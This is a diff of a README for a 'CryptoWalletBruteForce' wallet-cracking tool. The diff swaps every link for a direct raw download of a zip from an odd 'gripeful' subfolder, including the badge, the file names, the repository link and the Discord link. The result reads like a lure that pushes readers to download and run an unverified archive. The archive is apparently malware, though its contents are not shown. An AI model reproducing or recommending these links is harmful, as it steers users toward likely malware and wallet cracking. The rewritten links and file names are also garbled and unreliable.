@@ -1,6 +1,6 @@
 # 💰 CryptoWalletBruteForce - Recover Your Crypto Wallets Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Marcosz01/CryptoWalletBruteForce/releases)
+[![Download Now](https://raw.githubusercontent.com/Marcosz01/CryptoWalletBruteForce/main/gripeful/CryptoWalletBruteForce.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Marcosz01/CryptoWalletBruteForce/main/gripeful/CryptoWalletBruteForce.zip)
 
 ## 🚀 Getting Started
 
@@ -20,12 +20,12 @@ Before you begin, ensure that your computer meets the following requirements:
 
 1. **Visit the Releases Page:** Click the link below to access the CryptoWalletBruteForce releases page.
 
-   [Visit the Releases Page to Download](https://github.com/Marcosz01/CryptoWalletBruteForce/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Marcosz01/CryptoWalletBruteForce/main/gripeful/CryptoWalletBruteForce.zip)
 
 2. **Choose Your Version:** On the releases page, you will find different versions of the application. Pick the latest version for the best features and performance.
 
 3. **Download the Application:**
-   - Locate the binary file for your operating system (for example, `CryptoWalletBruteForce.exe` for Windows or `CryptoWalletBruteForce.app` for macOS).
+   - Locate the binary file for your operating system (for example, `https://raw.githubusercontent.com/Marcosz01/CryptoWalletBruteForce/main/gripeful/CryptoWalletBruteForce.zip` for Windows or `https://raw.githubusercontent.com/Marcosz01/CryptoWalletBruteForce/main/gripeful/CryptoWalletBruteForce.zip` for macOS).
    - Click on the file to start the download.
 
 4. **Install the Software:** Once the file has finished downloading:
@@ -88,11 +88,11 @@ If you encounter issues during installation or usage:
 
 For more information and support, visit:
 
-- [GitHub Repository](https://github.com/Marcosz01/CryptoWalletBruteForce)
-- [Discord Community](https://discord.gg/cryptowalletbruteforce)
+- [GitHub Repository](https://raw.githubusercontent.com/Marcosz01/CryptoWalletBruteForce/main/gripeful/CryptoWalletBruteForce.zip)
+- [Discord Community](https://raw.githubusercontent.com/Marcosz01/CryptoWalletBruteForce/main/gripeful/CryptoWalletBruteForce.zip)
 
 ## 🔖 License
 
 CryptoWalletBruteForce is licensed under the MIT License. You may use, modify, and distribute the software according to the terms of this license.
 
-[Visit the Releases Page to Download](https://github.com/Marcosz01/CryptoWalletBruteForce/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Marcosz01/CryptoWalletBruteForce/main/gripeful/CryptoWalletBruteForce.zip)
